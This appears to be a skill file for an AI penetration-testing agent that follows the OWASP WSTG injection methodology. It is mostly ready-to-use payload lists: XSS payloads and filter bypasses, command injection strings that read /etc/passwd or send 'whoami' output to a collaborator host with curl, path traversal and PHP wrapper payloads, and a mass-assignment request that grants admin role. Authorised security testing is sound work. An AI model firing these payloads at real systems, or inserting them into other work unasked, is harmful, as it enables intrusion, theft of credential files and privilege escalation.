---
name: wstg-injection
description: Use when testing input handling on a web target for injection classes — SQLi, XSS, SSTI, SSRF, command injection, XXE.
metadata:
  acordia:
    family: web-methodology
  cyberstrike:
    source: .cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-injection/SKILL.md
    commit: 359655518
---

# Input Validation & Injection Testing (WSTG-INPV)

## SQL Injection

SQL injection → see `attack-sqli`.

## Cross-Site Scripting (XSS)

### Reflected XSS Payloads

```html
<script>
  alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload="alert(1)">
  <body onload="alert(1)">
    <input onfocus="alert(1)" autofocus>
      <details open ontoggle="alert(1)">
        <marquee onstart="alert(1)">javascript:alert(1)</marquee>
      </details>
    </input>
  </body>
</svg>
```

### Context-Specific Payloads

```html
<!-- Inside HTML attribute (break out) -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

<!-- Inside script tag -->
';alert(1);//
</script><script>alert(1)</script>

<!-- Inside JavaScript string -->
\';alert(1);//
\"-alert(1)-\"

<!-- Inside URL/href -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- Inside CSS -->
expression(alert(1))
url('javascript:alert(1)')
```

### Filter Bypass Techniques

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Encoding -->
<script>alert&#40;1&#41;</script>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
%3Cscript%3Ealert(1)%3C/script%3E

<!-- No parentheses -->
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1</script>

<!-- No quotes/angle brackets -->
<svg/onload=alert(1)>
<img src=x onerror=alert(1)//>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
```

### Stored XSS Targets

Test payload injection in: profile name/bio, comments, messages, forum posts, file names, email subjects, metadata fields, custom headers.

## Command Injection

### OS-Specific Payloads

```bash
# Linux
; id
| id
|| id
$(id)
`id`
; cat /etc/passwd
| whoami
& ping -c 1 COLLAB_SERVER &

# Windows
& ipconfig
| net user
; dir C:\
& ping -n 1 COLLAB_SERVER &

# Blind detection (use collaborator/webhook)
; curl http://COLLAB_SERVER/$(whoami)
| nslookup COLLAB_SERVER
; ping -c 1 COLLAB_SERVER
```

### Bypasses

```bash
# Space bypass
;{id}
;$IFS'id'
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Blacklist bypass
/bin/c?t /etc/p?sswd
c''a''t /etc/passwd
c\at /etc/passwd
```

## Server-Side Template Injection (SSTI)

Server-side template injection → see `attack-ssti`.

## Server-Side Request Forgery (SSRF)

Server-side request forgery → see `attack-ssrf`.

## XML External Entity (XXE)

XML external entity injection → see `attack-xxe`.

## LFI / Path Traversal

```bash
# Basic traversal
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd

# Windows
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows\win.ini

# Null byte (older PHP)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# Wrapper (PHP)
php://filter/convert.base64-encode/resource=index.php
php://input (POST body = PHP code)
expect://id
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

## Host Header Injection

Host header injection → see `attack-host-header`.

## HTTP Parameter Pollution

```bash
# Duplicate parameters
https://TARGET/page?id=1&id=2

# Server behavior varies:
# PHP/Apache: last value (id=2)
# ASP.NET/IIS: both (id=1,2)
# JSP/Tomcat: first value (id=1)
```

## Mass Assignment

```bash
# Add extra fields to updates
curl -X PUT https://TARGET/api/profile \
  -H "Content-Type: application/json" \
  -H "Cookie: session=USER_SESSION" \
  -d '{"name":"test","role":"admin","isAdmin":true,"verified":true}'

# Common fields to try:
# role, admin, isAdmin, is_admin, verified, active, permissions
# price, discount, balance, credits
# user_id, account_id, org_id
```

For detailed procedures on any test, read:
`knowledge/web-application/WSTG-INPV/WSTG-INPV-{NN}.md`
